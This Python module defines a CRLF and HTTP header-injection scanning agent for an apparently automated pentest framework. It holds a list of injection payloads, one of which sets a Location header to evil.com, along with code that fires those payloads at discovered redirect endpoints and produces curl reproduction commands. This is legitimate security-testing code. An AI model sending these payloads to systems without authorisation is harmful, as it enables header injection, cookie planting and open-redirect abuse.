"""
CRLF Injection & Header Injection Capability Agent for PenFlow.

Capabilities:
  - HTTP Response Splitting via CRLF (%0d%0a) Injections
  - Custom Response Header Injection (Set-Cookie, Location)
  - Dynamic Redirect Endpoint Discovery from Recon Observations
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.crlf_injection")

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:%20penflow_crlf=1",
    "%0d%0aLocation:%20https://evil.com",
    "%0d%0aX-Injected-Header:%20penflow_crlf",
    "\r\nSet-Cookie: penflow_crlf=1",
    "\r\nX-Injected-Header: penflow_crlf"
]


class CRLFInjectionAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting CRLF injection, HTTP response splitting, and header injection vulnerabilities.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="CRLFInjectionAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="crlf_injection", name="CRLF / HTTP Response Splitting", description="Detects CRLF characters in parameters leading to arbitrary header injection", priority=self.priority, tags=["crlf", "header_injection", "response_splitting"])
        ]

    def _discover_endpoints(self, context: CapabilityExecutionContext, keywords: List[str]) -> List[str]:
        """Dynamically discovers endpoints matching target keywords from recon observations."""
        found = []
        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    url = data.get("url", "")
                    if url and any(kw in url.lower() for kw in keywords):
                        found.append(url)
                    elif "endpoints" in data and isinstance(data["endpoints"], list):
                        for ep in data["endpoints"]:
                            if isinstance(ep, dict) and ep.get("url"):
                                ep_url = ep["url"]
                                if any(kw in ep_url.lower() for kw in keywords):
                                    found.append(ep_url)

        dynamic_eps = context.get_dynamic_endpoints()
        if dynamic_eps:
            for ep in dynamic_eps:
                if isinstance(ep, dict) and ep.get("url"):
                    u = ep["url"]
                    if any(kw in u.lower() for kw in keywords):
                        found.append(u)

        if not found:
            base = f"https://{context.asset}"
            found = [
                f"{base}/redirect",
                f"{base}/return",
                f"{base}/next",
                f"{base}/goto",
                f"{base}/url"
            ]

        return list(dict.fromkeys(found))[:5]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        redirect_urls = self._discover_endpoints(context, ["redirect", "return", "next", "goto", "url"])

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for redirect_ep in redirect_urls:
                    for payload in CRLF_PAYLOADS:
                        sep = "&" if "?" in redirect_ep else "?"
                        test_url = f"{redirect_ep}{sep}url={payload}"
                        try:
                            resp = await client.get(test_url)
                            headers_lower = {k.lower(): v for k, v in resp.headers.items()}

                            if "penflow_crlf" in headers_lower or "x-injected-header" in headers_lower or ("set-cookie" in headers_lower and "penflow_crlf" in headers_lower["set-cookie"]):
                                curl_cmd = f"curl -i -s -k '{test_url}'"
                                exch_dict = {
                                    "request": {"method": "GET", "url": test_url},
                                    "response": {"status_code": resp.status_code, "headers": dict(resp.headers), "body_snippet": resp.text[:500]}
                                }

                                findings.append({
                                    "vulnerability_type": "crlf_injection",
                                    "target_url": test_url,
                                    "payload": payload,
                                    "severity": "HIGH",
                                    "confidence": 0.95,
                                    "is_vulnerable": True,
                                    "exploit_curl": curl_cmd,
                                    "reproduction_steps": self.poc_generator.generate_reproduction_steps("CRLF Header Injection", test_url, curl_cmd),
                                    "description": f"CRLF Injection confirmed on '{redirect_ep}': Injected arbitrary HTTP response header via payload '{payload}'.",
                                    "_exchange_obj": exch_dict
                                })
                                evidence["crlf_injected"] = True
                                evidence["tested_endpoint"] = redirect_ep
                                break
                        except Exception as e:
                            logger.debug(f"CRLF test failed on {test_url}: {e}")
                    if findings:
                        break

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
